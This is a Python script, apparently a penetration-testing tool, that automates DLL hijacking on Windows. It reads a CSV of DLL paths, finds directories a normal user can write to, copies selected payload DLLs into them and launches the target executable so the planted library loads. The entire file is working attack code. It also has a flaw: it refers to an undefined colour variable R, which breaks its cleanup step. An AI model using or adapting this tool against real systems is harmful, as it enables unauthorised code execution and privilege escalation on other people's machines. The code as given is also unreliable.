import csv
import os
import ctypes
import shutil
import subprocess
import time
from termcolor import colored
from colorama import init
import pyfiglet

init()
G  = '\033[32m' 
O  = '\033[33m' 
Y = '\033[93m'
BOLD = '\033[1m'
END = '\033[0m'

def banner():
    print(colored(pyfiglet.figlet_format("Auto DLL Hijacing (Exploitation)", font="standard"), "red" ))
    print(O+"Created By Rishabh Sharma"+END)




    
def parse_csv(file_path):
    directories = {}
    with open(file_path, 'r') as csvfile:
        reader = csv.DictReader(csvfile)
        for row in reader:
            dir_path = os.path.dirname(row['Path'])
            dll_name = os.path.basename(row['Path'])
            if dir_path not in directories:
                directories[dir_path] = []
            directories[dir_path].append(dll_name)
    return directories

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def check_directory_privileges(directory):
    try:
        test_file_path = os.path.join(directory, 'temp_permission_check.tmp')
        with open(test_file_path, 'w') as test_file:
            test_file.write('Permission check')
        os.remove(test_file_path)
        return True
    except PermissionError:
        print(f"Permission error: normal user cannot write to {directory}")
        return False
    except Exception as e:
        print(f"Error checking permissions for {directory}: {e}")
        return False

def copy_and_check_dll_hijacking(directories, payloads, process_name):
    for directory, dll_names in directories.items():
        if directory.lower().startswith("c:\\windows"):
            print(f"\nSkipping {directory} (within Windows directory)")
            continue

        for dll_name in dll_names:
            target_path = os.path.join(directory, dll_name)
            signal_file = os.path.join(directory, 'payload_loaded.txt')

            if os.path.exists(target_path):
                print(f"Skipping {target_path}... File already exists.")
                continue

            for payload_path in payloads:
                if not os.path.exists(payload_path):
                    print(f"Payload DLL not found: {payload_path}")
                    continue

                try:
                    print(O+f"\nTrying DLL Hijacking on {target_path} with {payload_path}"+END)
                    print(O+"Copying Payload...."+END)

                    try:
                        shutil.copy(payload_path, target_path)
                    except PermissionError:
                        print(f"Permission denied when copying to {target_path}")
                        continue

                    print(O+"Trying Execution...Please Check Payload Execution..."+END)

                    exe_name = os.path.basename(process_name)
                    exe_path = os.path.join(directory, exe_name)

                    proc = None  # Initialize proc
                    if os.path.exists(exe_path):
                        try:
                            proc = subprocess.Popen([exe_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            time.sleep(5)
                            proc.terminate()
                            proc.wait()
                        except Exception as e:
                            print(f"Failed to execute process {exe_path}: {e}")

                    print(R+f"Deleting {dll_name}...."+END)
                    try:
                        os.remove(target_path)
                    except PermissionError:
                        print(f"Permission denied when deleting {target_path}")
                    finally:
                        if proc:  # Only kill and wait if proc was initialized
                            proc.kill()  
                            proc.wait()  

                except Exception as e:
                    print(f"Error handling DLL hijacking for {target_path}: {e}")
                finally:
                    if os.path.exists(target_path):
                        try:
                            os.remove(target_path)
                        except PermissionError:
                            print(f"Permission denied when deleting {target_path}")
                    if os.path.exists(signal_file):
                        try:
                            os.remove(signal_file)
                        except PermissionError:
                            print(f"Permission denied when deleting {signal_file}")

                time.sleep(3)

def list_payloads(payloads_directory):
    return [f for f in os.listdir(payloads_directory) if f.endswith('.dll')]

def main():
    csv_file_path = 'output.csv'
    payloads_directory = 'Payloads'

    print(G + BOLD + "\nExecuting Run_After_DLLHijacking_Auto.py... DLL Auto Hijacking Start...." + END)
    process_name = input("Please enter the process name Directory (e.g., C:\\Program Files\\Chrome.exe): ")

    available_payloads = list_payloads(payloads_directory)
    print("Available payloads:")
    for i, payload in enumerate(available_payloads):
        print(f"{i + 1}: {payload}")

    selected_payloads = []
    while True:
        try:
            choices = input("Select payload(s) by number (e.g., 1,3,5) or 'all' for all payloads: ")
            if choices.lower() == 'all':
                selected_payloads = [os.path.join(payloads_directory, p) for p in available_payloads]
                break
            else:
                choices = [int(c.strip()) - 1 for c in choices.split(',')]
                if any(c < 0 or c >= len(available_payloads) for c in choices):
                    print("Invalid choice. Try again.")
                else:
                    selected_payloads = [os.path.join(payloads_directory, available_payloads[c]) for c in choices]
                    break
        except ValueError:
            print("Invalid input. Please enter numbers separated by commas or 'all'.")

    if is_admin():
        print(O + BOLD + "\nWarning: This script is running with admin privileges. Run it as a normal user for accurate results." + END)
        user_response = input("Do you want to check DLL hijacking with current privileges (Admin)? (Yes/Y to continue): ")
        if user_response.lower() in ["yes", "y"]:
            directories = parse_csv(csv_file_path)
            copy_and_check_dll_hijacking(directories, selected_payloads, process_name)
        return

    directories = parse_csv(csv_file_path)
    vulnerable_directories = []

    for directory in directories:
        if check_directory_privileges(directory):
            vulnerable_directories.append(directory)
        else:
            print(f"Directory requires elevated privileges: {directory}")

    if vulnerable_directories:
        print(G+BOLD+"\nPotentially vulnerable directories with normal user write privileges:"+END)
        for directory in vulnerable_directories:
            print(directory)
        # Run DLL hijacking for directories with normal user write privileges
        copy_and_check_dll_hijacking(directories, selected_payloads, process_name)
    else:
        print("No directories with normal user write privileges found.")

if __name__ == "__main__":
    banner()
    main()
